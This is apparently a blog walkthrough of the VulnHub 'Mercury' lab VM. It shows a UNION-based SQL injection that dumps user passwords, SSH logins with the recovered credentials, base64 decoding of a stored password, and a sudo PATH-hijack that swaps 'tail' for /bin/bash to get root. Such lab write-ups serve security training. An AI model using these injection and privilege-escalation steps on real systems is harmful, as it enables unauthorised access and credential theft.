---
layout: post
title:  "Case Study : Mercury / VulnHub"
---
- You’ll find this vm in Vulnhub `https://www.vulnhub.com/entry/the-planets-mercury,544/`

- Difficulty : Medium

## SQL injection
## Step 1
{% highlight sh %}
http://10.0.2.5:8080/mercuryfacts/1 UNION SELECT username from users--/
('john',), ('laura',), ('sam',), ('webmaster',))
{% endhighlight %}


## Step 2
{% highlight sh %}
http://10.0.2.5:8080/mercuryfacts/1 UNION SELECT password from users--/
 ('johnny1987',), ('lovemykids111',), ('lovemybeer111',), ('mercuryisthesizeof0.056Earths',))
{% endhighlight %}

## SSH webmaster, find encoded passwords
{% highlight sh %}
  cd mecury_proj/
  ls
  cat notes.txt
{% endhighlight %}

## Base64 decode the password
{% highlight sh %}
echo "bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==" | base64 -d
mercurymeandiameteris4880km
{% endhighlight %}

## SSH linuxmaster

- linuxmaster:mercurymeandiameteris4880km

```sh
(root : root) SETENV: /usr/bin/check_syslog.sh
```

```sh
cat /usr/bin/check_syslog.sh
#!/bin/bash
tail -n 10 /var/log/syslog
```

```sh
echo "/bin/bash" > tail
chmod 777 tail
export PATH=.:$PATH
sudo PATH=$PATH /usr/bin/check_syslog.sh
```